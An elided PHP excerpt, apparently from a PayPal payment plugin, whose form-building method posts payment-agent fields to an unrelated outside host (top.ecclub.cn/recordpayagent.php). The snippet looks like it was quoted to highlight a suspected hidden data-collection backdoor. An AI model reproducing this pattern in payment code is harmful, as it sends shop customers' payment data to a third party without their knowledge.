...
final class ectools_payment_plugin_paypal extends ectools_payment_app implements ectools_interface_payment_app{
    ...
    function gen_form(){
        ...
        $tmp_form.="<form name='applyForm' method='".$agentfield['postmethod']."' action='http://top.ecclub.cn/recordpayagent.php' target='_blank'>";
